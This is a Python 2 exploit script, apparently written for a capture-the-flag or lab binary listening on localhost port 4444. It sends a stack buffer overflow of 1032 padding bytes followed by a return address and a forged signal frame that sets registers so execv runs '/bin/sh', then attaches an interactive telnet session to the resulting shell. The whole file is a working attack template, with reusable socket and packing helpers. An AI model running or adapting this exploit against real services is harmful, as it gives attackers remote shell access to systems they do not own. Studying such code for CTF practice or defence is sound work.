#!/usr/bin/python
import random
import sys
import socket
import telnetlib
import os
import time
import threading
from struct import pack, unpack
from time import time

def recvuntil(sock, txt):
  d = ""
  while d.find(txt) == -1:
    try:
      dnow = sock.recv(1)
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

def recvall(sock, n):
  d = ""
  while len(d) != n:
    try:
      dnow = sock.recv(n - len(d))
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

# Proxy object for sockets.
class gsocket(object):
  def __init__(self, *p):
    self._sock = socket.socket(*p)

  def __getattr__(self, name):
    return getattr(self._sock, name)

  def recvall(self, n):
    err, ret = recvall(self._sock, n)
    if err != "OK":
      return False
    return ret

  def recvuntil(self, txt):
    err, ret = recvuntil(self._sock, txt)
    if err != "OK":
      return False
    return ret

# Base for any of my ROPs.
def db(v):
  return pack("<B", v)

def dw(v):
  return pack("<H", v)

def dd(v):
  return pack("<I", v)

def dq(v):
  return pack("<Q", v)

def rb(v):
  return unpack("<B", v[0])[0]

def rw(v):
  return unpack("<H", v[:2])[0]

def rd(v):
  return unpack("<I", v[:4])[0]

def rq(v):
  return unpack("<Q", v[:8])[0]

def go():
  global HOST
  global PORT
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))

  expl = "A" * 1032
  expl += dq(0x7FFFF7E02100)

  #tab = range(1024/8) #  0, 1, 2, 3...
  tab = [0]*(1024/8)
  tab[16] = 0x4141414141414141
  # rsp            0x7fffffffe0b8      0x7fffffffe0b8
  #eflags  0x206
  #cs             0x33                51
  #ss             0x2b                43
  tab[3] = 0x2b
  tab[0x16] = 0x206
  tab[0x17] = 0x33
  tab[0x14] = 0x7fffffffef00
  tab[0x15] = 0x0007FFFF7E1120D   # execv
  tab[0xd] = 0x7FFFF7F6BE80  # /bin/sh
  tab[0x11] = 0
  tab[0xe] = 0
  expl += ''.join([dq(x) for x in tab])

  # Put your code here!
  print s.recvuntil("Hi!\n")


  print "Press enter to continue"
  raw_input()

  s.sendall(expl)


  # Interactive sockets.
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()

  # Python console.
  # Note: you might need to modify ReceiverClass if you want
  #       to parse incoming packets.
  #ReceiverClass(s).start()
  #dct = locals()
  #for k in globals().keys():
  #  if k not in dct:
  #    dct[k] = globals()[k]
  #code.InteractiveConsole(dct).interact()

  s.close()

HOST = '127.0.0.1'
PORT = 4444
go()


